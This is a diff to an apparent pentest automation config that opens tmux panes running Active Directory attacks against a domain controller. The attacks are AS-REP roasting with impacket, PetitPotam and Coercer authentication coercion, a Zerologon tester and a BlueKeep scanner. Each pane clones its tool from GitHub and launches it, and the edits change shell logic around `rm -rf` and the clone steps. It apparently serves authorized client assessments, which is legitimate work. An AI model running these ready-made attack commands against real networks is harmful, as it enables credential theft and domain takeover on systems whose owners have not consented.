@@ -80,7 +80,7 @@ windows:
       panes:
         - ASREP roast:
           - tmux select-pane -T 'ASREP roast' -t "unauthd:ASREProast.0"
-          - rm -rf /opt/nomad-tools/impacket || git clone https://github.com/fortra/impacket.git /opt/nomad-tools/impacket 
+          - rm -rf /opt/nomad-tools/impacket && git clone https://github.com/fortra/impacket.git /opt/nomad-tools/impacket 
           - docker build -t "impacket:latest" /opt/nomad-tools/impacket
           - docker run -it --name newest_impacket -v /RSM/:/RSM --rm "impacket:latest"
           - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile <%= @settings["rootDir"] %>/usernames.txt -outputfile <%= @settings["rootDir"] %>/scans/unauthd-asrepRoast.txt -format john'; clear
@@ -92,13 +92,13 @@ windows:
           - crackmapexec smb $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '' -p '' -d <%= @settings["domain"] %> -M petitpotam | tee <%= @settings["rootDir"] %>/scans/petitpotam-unauthd.txt
         - PetitPotam.py:
           - tmux select-pane -T 'PetitPotam.py' -t "unauthd:coercAuth.1"
-          - cd /opt/nomad-tools/PetitPotam || (git clone https://github.com/topotam/PetitPotam.git /opt/nomad-tools/PetitPotam && cd /opt/nomad-tools/PetitPotam)
+          - cd /opt/nomad-tools/PetitPotam || git clone https://github.com/topotam/PetitPotam.git /opt/nomad-tools/PetitPotam && cd /opt/nomad-tools/PetitPotam
           - nomadIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
           - python3 PetitPotam.py -u '' -p '' -d <%= @settings["domain"] %> $nomadIP $(cat /RSM/dcIP.txt | head -n 1)
           - echo "Note eth0 is the default nomadIP used; modify nomadIP as needed"
         - Coercer:
           - tmux select-pane -T 'Coercer' -t "unauthd:coercAuth.2"
-          - cd /opt/nomad-tools/Coercer || (git clone https://github.com/p0dalirius/Coercer.git /opt/nomad-tools/Coercer && cd /opt/nomad-tools/Coercer && pipenv install)
+          - cd /opt/nomad-tools/Coercer || git clone https://github.com/p0dalirius/Coercer.git /opt/nomad-tools/Coercer && cd /opt/nomad-tools/Coercer && pipenv install
           - nomadIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
           - pipenv run python3 Coercer.py coerce -l $nomadIP -t $(cat /RSM/dcIP.txt | head -n 1) -u "" -p "" -d <%= @settings["domain"] %> -v
           - echo "Note eth0 is the default nomadIP used; modify nomadIP as needed"
@@ -106,9 +106,9 @@ windows:
       panes:
         - zerologon:
           - tmux select-pane -T 'zerologon' -t "unauthd:bigName.0"
-          - cd /opt/nomad-tools/CVE-2020-1472 || (git clone https://github.com/SecuraBV/CVE-2020-1472.git /opt/nomad-tools/CVE-2020-1472 && cd /opt/nomad-tools/CVE-2020-1472/ && pipenv install)
+          - cd /opt/nomad-tools/CVE-2020-1472 || git clone https://github.com/SecuraBV/CVE-2020-1472.git /opt/nomad-tools/CVE-2020-1472; cd /opt/nomad-tools/CVE-2020-1472/; pipenv install
           - dig any _kerberos._tcp.<%= @settings["domain"] %>
-          - <%= @settings["prefill"] %> 'pipenv run zerologon_tester.py $DC-netbiosName $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/scans/zerologon.txt'; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
+          - <%= @settings["prefill"] %> 'pipenv run zerologon_tester.py $DCnetbiosName $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/scans/zerologon.txt'; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
         - blueKeep:
           - tmux select-pane -T 'blueKeep' -t "unauthd:bigName.1"
           - cat <%= @settings["rootDir"] %>/scans/masscanPortList/rdp.lst && msfconsole -q -x "workspace -a <%= @settings["msfWorkspace"] %>; use scanner/rdp/cve_2019_0708_bluekeep; set rhosts file:<%= @settings["rootDir"] %>/scans/masscanPortList/rdp.lst; spool <%= @settings["rootDir"] %>/scans/blueKeep.txt; run; spool off; exit"; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
